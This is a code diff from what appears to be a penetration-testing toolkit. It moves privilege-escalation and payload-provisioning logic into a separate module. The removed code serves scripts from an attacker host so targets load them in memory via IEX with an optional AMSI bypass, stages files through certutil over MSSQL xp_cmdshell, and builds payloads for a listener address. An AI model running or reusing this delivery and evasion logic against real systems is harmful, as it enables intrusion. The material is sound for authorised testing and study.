@@ -27,8 +27,8 @@ from . import (__version__, adcs as adcs_mod, arsenal as arsenal_mod,
                executor as executor_mod, hostenum as hostenum_mod, ingest as ingest_mod,
                kb as kb_mod, kerberos as kerberos_mod, lab as lab_mod,
                mssql as mssql_mod, poc as poc_mod, preflight as preflight_mod,
-               privesc as privesc_mod, report as report_mod, scope as scope_mod,
-               spray as spray_mod, staging as staging_mod)
+               privesc as privesc_mod, provision as provision_mod,
+               report as report_mod, scope as scope_mod, spray as spray_mod)
 from .errors import ConfirmationError, FieldkitError
 from .state import DB_ENV_VAR, Store, default_db_path
 
@@ -520,32 +520,9 @@ def _host_vectors(store, cfg, host_ip):
 
 
 def _provision_to_target(store, host, cred, local, remote, label, allow, cfg):
-    """Get ``local`` onto the target at ``remote``: try smb/ssh ``--put-file`` first, then
-    fall back to download-staging (serve it, target fetches over the exec transport — e.g.
-    certutil over MSSQL xp_cmdshell). Returns ``(ok, note)``. Shared by escalate + prep."""
-    creates = [(f"{label} at {remote}", f"del {remote}")]
-    res = executor_mod.execute(
-        store, executor_mod.Action(
-            host=host, cred=cred, command=None, label=label,
-            safety="config-change", upload=(local, remote), creates=creates),
-        allow=allow, on_event=lambda m: print(m))
-    if not res.blocked and res.ok:
-        return True, "put-file"
-
-    def _exec(command):
-        return executor_mod.execute(
-            store, executor_mod.Action(
-                host=host, cred=cred, command=command, label=label,
-                safety="config-change", creates=creates),
-            allow=allow, on_event=lambda m: print(m))
-    dres = staging_mod.download_stage(host, local, remote, lhost=cfg.get("lhost"),
-                                      execute=_exec, on_event=lambda m: print(m))
-    if dres is None:
-        return False, (res.blocked or "no file-transfer path") + \
-            " — set `config set lhost=<ip>` to download-stage over the exec transport"
-    if dres.blocked or not dres.ok:
-        return False, dres.blocked or "download-staging failed"
-    return True, "download"
+    """Get ``local`` onto the target at ``remote`` — see :func:`fieldkit.provision.put`."""
+    return provision_mod.put(store, host, cred, local, remote, label, allow, cfg,
+                             on_event=print)
 
 
 def _build_dir():
@@ -640,104 +617,22 @@ def cmd_escalate(args):
             print("aborted — nothing ran")
             return 1
 
-        results = {}
-
-        def _run_vector(vector, command):
-            action = executor_mod.Action(
-                host=host, cred=cred, command=command,
-                label=f"escalate:{vector.key}", safety=vector.safety, shell=vector.shell)
-            return executor_mod.execute(store, action, allow=allow, on_event=lambda m: print(m))
-
-        def fire(vector):
-            serves = getattr(vector, "serves", ())
-            if serves:
-                # in-memory delivery: serve the script(s) over HTTP and let the target IEX
-                # them ({url} in the command). Nothing lands on disk.
-                paths = [arsenal_mod.find(n) for n in serves]
-                if not all(paths):
-                    missing = ", ".join(n for n, p in zip(serves, paths) if not p)
-                    res = executor_mod.ExecResult(
-                        blocked=f"{missing} not in the arsenal — stage it to serve in-memory")
-                elif not cfg.get("lhost"):
-                    res = executor_mod.ExecResult(
-                        blocked="no lhost — `config set lhost=<ip>` so the target can pull "
-                                "the in-memory payload")
-                else:
-                    directory = os.path.dirname(paths[0])
-                    served = os.path.basename(paths[0])
-                    amsi = evasion_mod.amsi_prefix(cfg.get("amsi_bypass"))
-                    label = evasion_mod.amsi_label(cfg.get("amsi_bypass"))
-                    with staging_mod.serve(directory) as port:
-                        url = f"http://{cfg.get('lhost')}:{port}/"
-                        print(f"  serving {served} on {cfg.get('lhost')}:{port} — "
-                              f"target loads it in memory"
-                              + (f"  (AMSI bypass: {label})" if label else ""))
-                        command = (vector.command.replace("{amsi}", amsi)
-                                   .replace("{url}", url).replace("{served}", served))
-                        res = _run_vector(vector, command)
-            else:
-                res = _run_vector(vector, vector.command)
-            results[vector.key] = res
-            return res
+        prov = provision_mod.Provisioner(store, host, cred, cfg, allow,
+                                         build_dir=_build_dir(), on_event=print)
 
         def mark_caught(technique):
             store.record_evasion(technique, "caught",
                                  detail=f"caught live during escalation on {args.host} "
                                         f"({now.date().isoformat()})")
 
-        def put_file(local, remote, label):
-            return _provision_to_target(store, host, cred, local, remote, label, allow, cfg)
-
-        def stage(vector):
-            done = []
-            for name, remote in vector.stages:
-                local = arsenal_mod.find(name)
-                if not local:
-                    return escalate_mod.StageResult(
-                        False, f"{name} not in the arsenal — `fieldkit arsenal` to fetch it")
-                ok, how = put_file(local, remote, f"stage:{name}")
-                if not ok:
-                    return escalate_mod.StageResult(False, how)
-                done.append(f"{name}→{remote} ({how})")
-            return escalate_mod.StageResult(True, "staged " + ", ".join(done))
-
-        arch = "x86" if cfg.get("arch") == "x86" else "x64"
-
-        def build(vector, corrected):
-            done = []
-            for fmt, remote, bcmd in vector.builds:
-                use_arch = "x86" if (corrected and arch == "x64") else \
-                    ("x64" if corrected else arch)
-                out = os.path.join(_build_dir(), f"{vector.key.replace(':', '_')}.{fmt}")
-                bres = poc_mod.build(fmt, out, arch=use_arch, command=bcmd,
-                                     lhost=cfg.get("lhost"), lport=cfg.get("lport"))
-                if not bres.ok:
-                    return escalate_mod.StageResult(False, bres.detail)
-                ok, how = put_file(out, remote, f"build:{fmt}")
-                if not ok:
-                    return escalate_mod.StageResult(False, how)
-                done.append(f"{fmt}({bres.tool})→{remote} ({how})")
-            return escalate_mod.StageResult(True, "built+staged " + ", ".join(done))
-
         print("\n--- escalating ---")
         outcome = escalate_mod.escalate(
-            vectors, fire=fire, allow=allow, os_name=host["os"], budget=budget,
+            vectors, fire=prov.fire, allow=allow, os_name=host["os"], budget=budget,
             delivery_order=delivery_order, caught=caught, mark_caught=mark_caught,
-            stage=None if args.no_stage else stage,
-            build=None if args.no_stage else build, on_event=lambda m: print(m))
+            stage=None if args.no_stage else prov.stage,
+            build=None if args.no_stage else prov.build, on_event=lambda m: print(m))
 
-        if outcome.ok:
-            v = outcome.proven
-            vtype = v.report_type or v.key.split(":", 1)[0]
-            res = results[v.key]
-            evidence = (res.output or "").strip()[:500]
-            finding_id, _ = store.add_finding(vtype, v.title, host_id=host["id"],
-                                              proven=True, evidence=evidence)
-            if res.step_id is not None:  # link the captured proof step (anti-fabrication)
-                store.attach_step(res.step_id, finding_id)
-            if v.cleanup:
-                store.add_artifact(f"{v.title} (artifact)", cleanup_cmd=v.cleanup,
-                                   host_id=host["id"])
+        provision_mod.record_proof(store, outcome, prov.results, host)
 
     _print_escalation_outcome(outcome)
     return 0 if outcome.ok else 1
